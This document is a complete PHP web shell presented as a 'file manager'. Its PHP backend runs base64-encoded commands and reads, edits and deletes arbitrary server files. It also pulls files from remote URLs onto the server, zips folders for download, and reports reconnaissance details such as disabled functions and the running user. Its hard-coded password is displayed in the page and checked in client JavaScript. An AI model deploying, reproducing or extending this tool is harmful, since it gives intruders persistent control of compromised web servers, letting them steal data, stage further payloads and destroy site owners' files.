<?php
session_start();
error_reporting(0);
$PASSWORD = 'Krishna@Yadav#2015';
$PASSWORD_HASH = md5($PASSWORD);

$auth = false;
if(isset($_SESSION['krishna_auth']) && $_SESSION['krishna_auth'] === true) $auth = true;
if(!$auth && isset($_COOKIE['krishna_session']) && $_COOKIE['krishna_session'] === $PASSWORD_HASH) { $_SESSION['krishna_auth'] = true; $auth = true; }

if(isset($_GET['token'])) {
    $input_token = trim($_GET['token']);
    if(md5($input_token) === $PASSWORD_HASH || $input_token === $PASSWORD) {
        $_SESSION['krishna_auth'] = true;
        $auth = true;
        setcookie('krishna_session', $PASSWORD_HASH, time()+86400*30, '/');
    }
}

if(isset($_GET['check_auth'])) { header('Content-Type: application/json'); echo json_encode(['auth' => $auth]); exit; }
if(isset($_GET['logout'])) { session_destroy(); setcookie('krishna_session', '', time()-3600, '/'); header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?')); exit; }

// Command execution with advanced features
if($auth && isset($_GET['exec'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = base64_decode($_GET['exec']);
    $cmd = preg_replace('/[;\`|&$(){}<>]/', "\n", $cmd);
    $lines = explode("\n", $cmd);
    $out = [];
    foreach($lines as $line) {
        $line = trim($line); if(empty($line)) continue;
        if(strpos($line, '..') !== false) { $out[] = "⛔ PATH TRAVERSAL BLOCKED"; continue; }
        $parts = explode(' ', $line);
        $c = strtolower(trim($parts[0]));
        $a1 = isset($parts[1]) ? trim($parts[1]) : '';
        $a2 = isset($parts[2]) ? trim($parts[2]) : '';
        try {
            switch($c) {
                case 'ls': $t=$a1?:'.'; $out[] = is_dir($t) ? implode("\n", array_slice(scandir($t),2)) : "❌ NOT DIR"; break;
                case 'cat': $out[] = (!file_exists($a1)?"❌ NOT FOUND":(is_dir($a1)?"📁 IS DIR":file_get_contents($a1))); break;
                case 'rm': $out[] = unlink($a1) ? "✅ DELETED" : "❌ FAIL"; break;
                case 'rmdir': $out[] = rmdir($a1) ? "✅ DIR REMOVED" : "❌ FAIL (NOT EMPTY)"; break;
                case 'mv': $out[] = rename($a1,$a2) ? "✅ MOVED" : "❌ FAIL"; break;
                case 'cp': $out[] = copy($a1,$a2) ? "✅ COPIED" : "❌ FAIL"; break;
                case 'chmod': $out[] = chmod($a1,0755) ? "✅ CHMOD 755" : "❌ FAIL"; break;
                case 'find': $d=$a1?:'.'; $f=[]; $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS)); foreach($it as $file) if(!$file->isDir()) $f[]=$file->getRealPath(); $out[]=empty($f)?"📂 NO FILES":implode("\n",$f); break;
                case 'grep': $p=$a1; $d=$a2?:'.'; $m=[]; $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS)); foreach($it as $f) if(!$f->isDir() && strpos(file_get_contents($f->getRealPath()),$p)!==false) $m[]=$f->getRealPath(); $out[]=empty($m)?"🔍 NOT FOUND":implode("\n",$m); break;
                case 'du': $t=$a1?:'.'; $s=0; if(is_dir($t)) { $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t, RecursiveDirectoryIterator::SKIP_DOTS)); foreach($it as $f) if(!$f->isDir()) $s+=$f->getSize(); } else $s=filesize($t); $out[]=round($s/1024,2)." KB"; break;
                case 'wget': if(!empty($a1) && !empty($a2)) { $ch = curl_init($a1); $fp = fopen($a2, 'wb'); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); fclose($fp); $out[] = "✅ DOWNLOADED: $a2"; } else { $out[] = "wget: need url and filename"; } break;
                case 'upload_url': if(!empty($a1) && !empty($a2)) { $ch = curl_init($a1); $fp = fopen($a2, 'wb'); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); fclose($fp); $out[] = "✅ UPLOADED FROM URL: $a2"; } else { $out[] = "upload_url: need url and filename"; } break;
                default: $out[]="❓ UNKNOWN: $c (ls,cat,rm,rmdir,mv,cp,chmod,find,grep,du,wget,upload_url)";
            }
        } catch(Exception $e) { $out[]="⚠️ ERROR: ".$e->getMessage(); }
    }
    echo empty($out) ? "📭 NO OUTPUT" : implode("\n", $out);
    exit;
}

// File download
if($auth && isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $path = './' . $file;
    if(file_exists($path) && !is_dir($path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$file.'"');
        header('Content-Length: '.filesize($path));
        readfile($path);
        exit;
    }
}

// File view
if($auth && isset($_GET['view'])) {
    $file = $_GET['view'];
    if(file_exists($file) && !is_dir($file) && strpos($file, '..') === false) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
        exit;
    }
}

// Create zip archive
if($auth && isset($_GET['zip'])) {
    $folder = trim($_GET['zip']);
    if($folder && is_dir($folder) && strpos($folder,'..')===false && $folder !== '..') {
        $zipname = basename($folder).'_'.time().'.zip';
        $zip = new ZipArchive();
        if($zip->open($zipname, ZipArchive::CREATE) === true) {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach($it as $f) if(!$f->isDir()) $zip->addFile($f->getRealPath(), substr($f->getRealPath(), strlen($folder)+1));
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="'.$zipname.'"');
            header('Content-Length: '.filesize($zipname));
            readfile($zipname);
            unlink($zipname);
            exit;
        }
    }
}

// Save file
if($auth && isset($_POST['save_file'])) {
    $file = $_POST['file_path'];
    $content = $_POST['file_content'];
    if(file_put_contents($file, $content) !== false) echo "✅ SAVED";
    else echo "❌ SAVE FAILED";
    exit;
}

// Create file
if($auth && isset($_POST['create_file'])) {
    $file = $_POST['new_file'];
    if(!file_exists($file) && file_put_contents($file, '') !== false) echo "✅ CREATED: ".basename($file);
    else echo "❌ CREATE FAILED";
    exit;
}

// Create folder
if($auth && isset($_POST['create_folder'])) {
    $folder = $_POST['new_folder'];
    if(mkdir($folder, 0755)) echo "✅ FOLDER CREATED: ".basename($folder);
    else echo "❌ CREATE FAILED";
    exit;
}

// Upload file
if($auth && isset($_FILES['upload_file'])) {
    $target = './' . basename($_FILES['upload_file']['name']);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) echo "✅ UPLOADED: ".basename($target);
    else echo "❌ UPLOAD FAIL";
    exit;
}

// System info endpoint
if($auth && isset($_GET['system_info'])) {
    header('Content-Type: application/json');
    $info = [
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'current_user' => get_current_user(),
        'os' => PHP_OS,
        'disk_free' => round(disk_free_space('.') / 1024 / 1024, 2) . ' MB',
        'disk_total' => round(disk_total_space('.') / 1024 / 1024, 2) . ' MB',
        'disable_functions' => ini_get('disable_functions') ?: 'None',
        'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF'
    ];
    echo json_encode($info);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔱 KRISHNA FILE MANAGER · ADVANCED</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0;}
        body{background:url('https://i.pinimg.com/originals/65/02/82/6502826ee4b99b97aaf4b172186dfd86.jpg') no-repeat center center fixed;background-size:cover;font-family:'Fira Code','SF Mono',monospace;padding:20px;min-height:100vh;position:relative;}
        body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.75);z-index:0;}
        .container{max-width:1600px;margin:0 auto;position:relative;z-index:1;}
        .header{background:rgba(11,17,30,0.95);backdrop-filter:blur(10px);border-radius:20px;padding:15px 25px;margin-bottom:25px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:15px;border:1px solid rgba(59,130,246,0.5);box-shadow:0 5px 20px rgba(0,0,0,0.3);}
        .logo{display:flex;align-items:center;gap:12px;}
        .logo span{font-size:28px;animation:pulse 2s infinite;}
        @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.7;}}
        .logo h1{font-size:20px;color:#9cdcfe;text-shadow:0 0 5px #3b82f6;}
        .badge{background:#1e2a3e;padding:5px 15px;border-radius:40px;font-size:11px;color:#3b82f6;border-left:2px solid #3b82f6;}
        .auth-area{display:flex;gap:12px;align-items:center;}
        .auth-input{background:#010409;border:1px solid #2d3e5f;padding:8px 15px;border-radius:40px;color:#b9f3f0;font-family:monospace;width:240px;outline:none;transition:0.2s;}
        .auth-input:focus{border-color:#3b82f6;box-shadow:0 0 5px #3b82f6;}
        .btn{background:linear-gradient(135deg,#1f2a48,#2c3e66);border:none;padding:8px 20px;border-radius:40px;color:white;cursor:pointer;font-family:monospace;font-size:13px;transition:0.2s;font-weight:bold;}
        .btn:hover{background:linear-gradient(135deg,#3e5a85,#4a6e9e);transform:translateY(-1px);box-shadow:0 5px 15px rgba(0,0,0,0.3);}
        .flag{background:#263238;padding:5px 15px;border-radius:20px;font-size:12px;font-weight:bold;}
        .flag.active{background:#1f543e;color:#b9ffcf;box-shadow:0 0 10px #2ecc71;}
        .grid{display:grid;grid-template-columns:1fr 1.2fr;gap:20px;margin-bottom:20px;}
        @media(max-width:900px){.grid{grid-template-columns:1fr;}}
        .card{background:rgba(3,6,12,0.95);backdrop-filter:blur(5px);border-radius:20px;border:1px solid #263a55;overflow:hidden;transition:0.2s;}
        .card:hover{border-color:#3b82f6;box-shadow:0 5px 20px rgba(59,130,246,0.2);}
        .card-header{background:linear-gradient(135deg,#0f172f,#0a0f25);padding:12px 20px;border-bottom:1px solid #253651;font-size:12px;font-weight:600;color:#7f9fcf;text-transform:uppercase;letter-spacing:1px;}
        .card-body{padding:20px;}
        .file-list{background:#0a0f17;border-radius:12px;max-height:500px;overflow-y:auto;}
        .file-item{display:flex;justify-content:space-between;align-items:center;padding:10px 12px;border-bottom:1px solid #1f2f45;font-size:13px;transition:0.1s;}
        .file-item:hover{background:#101826;transform:translateX(2px);}
        .file-name{color:#9cdcfe;cursor:pointer;flex:1;word-break:break-all;}
        .file-name:hover{text-decoration:underline;color:#3b82f6;}
        .file-actions{display:flex;gap:6px;}
        .file-actions button{background:#1e2a3e;border:none;color:#ccc;padding:4px 10px;border-radius:15px;cursor:pointer;font-size:11px;font-family:monospace;transition:0.1s;}
        .file-actions button:hover{background:#3e5a85;color:white;transform:scale(1.05);}
        .editor{width:100%;background:#0c111b;border:1px solid #2b3b54;color:#d4f1f9;font-family:'Fira Code',monospace;font-size:13px;padding:12px;border-radius:12px;resize:vertical;min-height:350px;}
        .editor:focus{border-color:#3b82f6;outline:none;box-shadow:0 0 5px #3b82f6;}
        .row{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;}
        .row input{flex:1;background:#0c111b;border:1px solid #2b3b54;color:#d4f1f9;padding:10px;border-radius:12px;font-family:monospace;}
        .row input:focus{border-color:#3b82f6;outline:none;}
        .chip{background:#101826;padding:5px 12px;border-radius:20px;font-size:11px;cursor:pointer;display:inline-block;margin:3px;border:1px solid #2f4162;transition:0.1s;}
        .chip:hover{background:#1e2f48;color:white;border-color:#5f8ac9;transform:translateY(-1px);}
        .console{background:rgba(2,6,23,0.95);backdrop-filter:blur(5px);border-radius:16px;border:1px solid #2d3f5c;margin-top:20px;}
        .console-header{background:#0f172f;padding:10px 20px;font-size:11px;font-weight:600;color:#7f9fcf;display:flex;justify-content:space-between;align-items:center;}
        .console-output{padding:15px;min-height:150px;max-height:300px;overflow:auto;font-size:12px;white-space:pre-wrap;color:#cbd5f0;font-family:monospace;background:#010409;}
        .upload-area{display:flex;gap:10px;margin-top:15px;}
        .quick-actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;}
        hr{margin:15px 0;border-color:#1f3147;}
        .current-file{background:#0f172f;padding:8px 12px;border-radius:10px;margin-bottom:10px;font-size:12px;color:#7f9fcf;border-left:2px solid #3b82f6;}
        .hidden{display:none !important;}
        .sys-info{background:#0a0f17;border-radius:10px;padding:10px;margin-bottom:15px;font-size:11px;color:#7f9fcf;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px;}
        .sys-info span{color:#9cdcfe;font-weight:bold;}
        ::-webkit-scrollbar{width:8px;height:8px;}
        ::-webkit-scrollbar-track{background:#0a0f17;border-radius:4px;}
        ::-webkit-scrollbar-thumb{background:#2c3e66;border-radius:4px;}
        ::-webkit-scrollbar-thumb:hover{background:#3e5a85;}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">
            <span>🔱</span>
            <h1>KRISHNA FILE MANAGER · ADVANCED</h1>
            <div class="badge">v3.0 · FULL CONTROL</div>
        </div>
        <div class="auth-area">
            <input type="password" id="passwordInput" class="auth-input" placeholder="Enter password: Krishna@Yadav#2015" value="">
            <button id="authBtn" class="btn">🔑 AUTHENTICATE</button>
            <div id="authFlag" class="flag">🔒 LOCKED</div>
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <div class="card-header">📁 FILE BROWSER</div>
            <div class="card-body">
                <div class="row">
                    <input type="text" id="browsePath" value="." placeholder="directory path">
                    <button id="browseBtn" class="btn">🔍 BROWSE</button>
                    <button id="refreshBtn" class="btn">🔄 REFRESH</button>
                </div>
                <div id="sysInfo" class="sys-info"></div>
                <div id="fileListContainer" class="file-list">🔐 Enter password: <strong style="color:#3b82f6">Krishna@Yadav#2015</strong> and click AUTHENTICATE</div>
                <div class="upload-area">
                    <input type="file" id="uploadFile" style="background:#0c111b;color:#fff;border:1px solid #2b3b54;border-radius:12px;padding:8px;flex:1;">
                    <button id="uploadBtn" class="btn">📤 UPLOAD</button>
                </div>
                <hr>
                <div class="quick-actions">
                    <button id="newFileBtn" class="btn" style="background:#2a3a5a;">📄 NEW FILE</button>
                    <button id="newFolderBtn" class="btn" style="background:#2a3a5a;">📁 NEW FOLDER</button>
                    <button id="zipFolderBtn" class="btn" style="background:#2a3a5a;">📦 ZIP CURRENT</button>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">✏️ FILE EDITOR <span id="currentFileSpan" style="color:#6fcf97;font-size:10px;"></span></div>
            <div class="card-body">
                <div id="editSection">
                    <div id="currentFileDisplay" class="current-file"></div>
                    <textarea id="editor" class="editor" placeholder="Click on any file to edit..."></textarea>
                    <div class="row" style="margin-top:15px;">
                        <button id="saveFileBtn" class="btn">💾 SAVE</button>
                        <button id="downloadFileBtn" class="btn">⬇️ DOWNLOAD</button>
                        <button id="deleteFileBtn" class="btn" style="background:#4a1a2e;">🗑️ DELETE</button>
                        <button id="closeEditorBtn" class="btn" style="background:#263238;">✖️ CLOSE</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="card" style="margin-bottom:20px;">
        <div class="card-header">⚡ QUICK COMMANDS & TOOLS</div>
        <div class="card-body">
            <div>
                <span class="chip" data-cmd="ls .">📁 ls .</span>
                <span class="chip" data-cmd="find .">🔍 find .</span>
                <span class="chip" data-cmd="du .">💾 du .</span>
                <span class="chip" data-cmd="grep error .">🔎 grep error</span>
                <span class="chip" data-cmd="chmod 755">🔧 chmod</span>
                <span class="chip" id="wgetTool">📥 WGET URL</span>
                <span class="chip" id="urlUploadTool">🌐 URL UPLOAD</span>
            </div>
            <div class="row" style="margin-top:10px;">
                <input type="text" id="customCommand" placeholder="custom command (ls, cat, rm, mv, cp, find, grep, du, rmdir, wget, upload_url)">
                <button id="runCommandBtn" class="btn">▶ EXECUTE</button>
            </div>
        </div>
    </div>

    <div class="console">
        <div class="console-header">
            <span>📟 OUTPUT CONSOLE</span>
            <div>
                <button id="clearConsoleBtn" style="background:#263238;border:none;color:#ccc;padding:4px 12px;border-radius:20px;cursor:pointer;margin-right:10px;">🗑️ CLEAR</button>
                <button id="logoutBtn" style="background:#4a1a2e;border:none;color:#ffaaaa;padding:4px 15px;border-radius:20px;cursor:pointer;">🚪 LOGOUT</button>
            </div>
        </div>
        <div id="consoleOutput" class="console-output">/* Welcome to Krishna File Manager · Password: Krishna@Yadav#2015 */</div>
    </div>
</div>

<script>
(function(){
    const CORRECT_PASSWORD = "Krishna@Yadav#2015";
    let isAuthenticated = false;
    let currentBrowsePath = '.';
    let currentEditFile = '';

    function log(msg, isError = false) {
        const consoleDiv = document.getElementById('consoleOutput');
        consoleDiv.innerHTML = msg;
        consoleDiv.style.color = isError ? '#ffb4a2' : '#cbd5f0';
    }

    function clearConsole() {
        document.getElementById('consoleOutput').innerHTML = '/* Console cleared */';
    }

    async function loadSystemInfo() {
        try {
            const resp = await fetch(window.location.pathname + '?system_info=1');
            const info = await resp.json();
            const sysDiv = document.getElementById('sysInfo');
            sysDiv.innerHTML = `
                <span>🐘 PHP: ${info.php_version}</span>
                <span>🖥️ OS: ${info.os}</span>
                <span>👤 User: ${info.current_user}</span>
                <span>💾 Free: ${info.disk_free} / ${info.disk_total}</span>
                <span>🌐 IP: ${info.remote_addr}</span>
            `;
        } catch(e) {}
    }

    async function checkAuth() {
        try {
            const resp = await fetch(window.location.pathname + '?check_auth=' + Date.now());
            const data = await resp.json();
            isAuthenticated = data.auth;
            const flag = document.getElementById('authFlag');
            const passwordInput = document.getElementById('passwordInput');
            const authBtn = document.getElementById('authBtn');
            
            if(isAuthenticated) {
                flag.innerHTML = '✅ ACTIVE';
                flag.classList.add('active');
                passwordInput.classList.add('hidden');
                authBtn.classList.add('hidden');
                await loadSystemInfo();
                await browseFiles('.');
                return true;
            } else {
                flag.innerHTML = '🔒 LOCKED';
                flag.classList.remove('active');
                passwordInput.classList.remove('hidden');
                authBtn.classList.remove('hidden');
                return false;
            }
        } catch(e) { return false; }
    }

    async function authenticate() {
        const pwd = document.getElementById('passwordInput').value.trim();
        if(pwd !== CORRECT_PASSWORD) {
            log('❌ WRONG PASSWORD! Use: Krishna@Yadav#2015', true);
            return;
        }
        log('⏳ Authenticating...');
        await fetch(window.location.pathname + '?token=' + encodeURIComponent(pwd));
        await new Promise(r => setTimeout(r, 300));
        const authStatus = await checkAuth();
        if(authStatus) {
            log('✅ AUTHENTICATED SUCCESSFULLY!');
            document.getElementById('passwordInput').value = '';
        } else {
            log('❌ AUTH FAILED', true);
        }
    }

    async function logout() {
        await fetch(window.location.pathname + '?logout=1');
        await checkAuth();
        log('🔓 LOGGED OUT');
        document.getElementById('fileListContainer').innerHTML = '🔐 Login required';
        document.getElementById('editor').value = '';
        document.getElementById('currentFileDisplay').innerHTML = '';
        currentEditFile = '';
    }

    async function executeCommand(command, silent = false) {
        if(!isAuthenticated) { log('⛔ AUTH REQUIRED', true); return false; }
        if(!command.trim()) return false;
        const b64 = btoa(unescape(encodeURIComponent(command)));
        const url = window.location.pathname + '?exec=' + encodeURIComponent(b64);
        if(!silent) log('⏳ Running: ' + command);
        try {
            const resp = await fetch(url);
            const text = await resp.text();
            if(!silent) log(text || '📭 empty');
            return text;
        } catch(e) { log('🔥 ERROR: ' + e.message, true); return false; }
    }

    async function browseFiles(path) {
        if(!isAuthenticated) { log('⛔ Authenticate first', true); return; }
        currentBrowsePath = path;
        document.getElementById('browsePath').value = path;
        const result = await executeCommand('ls ' + path, true);
        if(result) {
            setTimeout(() => {
                const items = result.split('\n').filter(l => l.trim() && !l.includes('BLOCKED') && !l.includes('NOT DIR') && !l.includes('❌'));
                let html = '';
                for(let item of items) {
                    const fullPath = path === '.' ? item : path + '/' + item;
                    html += `<div class="file-item">
                        <span class="file-name" onclick="editFile('${fullPath.replace(/'/g, "\\'")}')">${item.includes('.') ? '📄' : '📁'} ${item}</span>
                        <div class="file-actions">
                            <button onclick="downloadFile('${item.replace(/'/g, "\\'")}')">⬇️</button>
                            <button onclick="deleteFile('${fullPath.replace(/'/g, "\\'")}')">🗑️</button>
                            <button onclick="browseFolder('${fullPath.replace(/'/g, "\\'")}')">📂 OPEN</button>
                        </div>
                    </div>`;
                }
                document.getElementById('fileListContainer').innerHTML = html || '<div style="padding:20px;text-align:center;color:#888;">📂 Empty folder</div>';
            }, 100);
        }
    }

    window.browseFolder = function(path) { browseFiles(path); };
    window.editFile = async function(path) {
        if(!isAuthenticated) return;
        currentEditFile = path;
        document.getElementById('currentFileDisplay').innerHTML = `📄 Editing: ${path}`;
        const content = await executeCommand('cat ' + path, true);
        if(content && !content.includes('NOT FOUND') && !content.includes('IS DIR')) {
            document.getElementById('editor').value = content;
            log(`📝 Loaded: ${path}`);
        } else {
            document.getElementById('editor').value = 'Error loading file';
            log('❌ Cannot load file', true);
        }
    };
    window.downloadFile = function(filename) { window.location.href = window.location.pathname + '?download=' + encodeURIComponent(filename); };
    window.deleteFile = async function(path) {
        if(confirm(`⚠️ Delete ${path} ?`)) {
            await executeCommand('rm ' + path, true);
            await browseFiles(currentBrowsePath);
            if(currentEditFile === path) {
                document.getElementById('editor').value = '';
                document.getElementById('currentFileDisplay').innerHTML = '';
                currentEditFile = '';
            }
        }
    };

    async function saveCurrentFile() {
        if(!currentEditFile) { alert('No file open. Click on a file first.'); return; }
        const content = document.getElementById('editor').value;
        const formData = new FormData();
        formData.append('save_file', '1');
        formData.append('file_path', currentEditFile);
        formData.append('file_content', content);
        const resp = await fetch(window.location.pathname, { method: 'POST', body: formData });
        const result = await resp.text();
        log(result);
        if(result.includes('SAVED')) await browseFiles(currentBrowsePath);
    }

    async function uploadFile() {
        const input = document.getElementById('uploadFile');
        if(!input.files[0]) { alert('Select a file'); return; }
        const formData = new FormData();
        formData.append('upload_file', input.files[0]);
        const resp = await fetch(window.location.pathname, { method: 'POST', body: formData });
        const result = await resp.text();
        log(result);
        if(result.includes('UPLOADED')) {
            await browseFiles(currentBrowsePath);
            input.value = '';
        }
    }

    async function createNewFile() {
        const filename = prompt('New file name:', 'newfile.txt');
        if(!filename) return;
        const formData = new FormData();
        formData.append('create_file', '1');
        formData.append('new_file', filename);
        const resp = await fetch(window.location.pathname, { method: 'POST', body: formData });
        const result = await resp.text();
        log(result);
        if(result.includes('CREATED')) await browseFiles(currentBrowsePath);
    }

    async function createNewFolder() {
        const foldername = prompt('Folder name:', 'newfolder');
        if(!foldername) return;
        const formData = new FormData();
        formData.append('create_folder', '1');
        formData.append('new_folder', foldername);
        const resp = await fetch(window.location.pathname, { method: 'POST', body: formData });
        const result = await resp.text();
        log(result);
        if(result.includes('CREATED')) await browseFiles(currentBrowsePath);
    }

    function zipCurrentFolder() {
        const folder = document.getElementById('browsePath').value;
        if(!folder) { alert('Select folder'); return; }
        window.location.href = window.location.pathname + '?zip=' + encodeURIComponent(folder);
    }

    function closeEditor() {
        document.getElementById('editor').value = '';
        document.getElementById('currentFileDisplay').innerHTML = '';
        currentEditFile = '';
        log('Editor closed');
    }

    async function wgetFile() {
        const url = prompt('Enter URL to download:', 'https://example.com/file.zip');
        if(!url) return;
        const filename = prompt('Save as:', url.split('/').pop() || 'downloaded_file');
        if(!filename) return;
        await executeCommand(`wget ${url} ${filename}`);
        await browseFiles(currentBrowsePath);
    }

    async function urlUpload() {
        const url = prompt('Enter URL to upload:', 'https://example.com/file.txt');
        if(!url) return;
        const filename = prompt('Save as:', url.split('/').pop() || 'uploaded_file');
        if(!filename) return;
        await executeCommand(`upload_url ${url} ${filename}`);
        await browseFiles(currentBrowsePath);
    }

    document.getElementById('authBtn').addEventListener('click', authenticate);
    document.getElementById('logoutBtn').addEventListener('click', logout);
    document.getElementById('clearConsoleBtn').addEventListener('click', clearConsole);
    document.getElementById('browseBtn').addEventListener('click', () => browseFiles(document.getElementById('browsePath').value));
    document.getElementById('refreshBtn').addEventListener('click', () => browseFiles(currentBrowsePath));
    document.getElementById('saveFileBtn').addEventListener('click', saveCurrentFile);
    document.getElementById('downloadFileBtn').addEventListener('click', () => { if(currentEditFile) downloadFile(currentEditFile.split('/').pop()); else alert('Open a file first'); });
    document.getElementById('deleteFileBtn').addEventListener('click', () => { if(currentEditFile) deleteFile(currentEditFile); else alert('Open a file first'); });
    document.getElementById('uploadBtn').addEventListener('click', uploadFile);
    document.getElementById('runCommandBtn').addEventListener('click', () => executeCommand(document.getElementById('customCommand').value));
    document.getElementById('newFileBtn').addEventListener('click', createNewFile);
    document.getElementById('newFolderBtn').addEventListener('click', createNewFolder);
    document.getElementById('zipFolderBtn').addEventListener('click', zipCurrentFolder);
    document.getElementById('closeEditorBtn').addEventListener('click', closeEditor);
    document.getElementById('wgetTool').addEventListener('click', wgetFile);
    document.getElementById('urlUploadTool').addEventListener('click', urlUpload);
    
    document.querySelectorAll('.chip[data-cmd]').forEach(chip => {
        chip.addEventListener('click', () => executeCommand(chip.getAttribute('data-cmd')));
    });

    document.getElementById('passwordInput').addEventListener('keypress', function(e) { if(e.key === 'Enter') authenticate(); });

    checkAuth();
})();
</script>
</body>
</html>
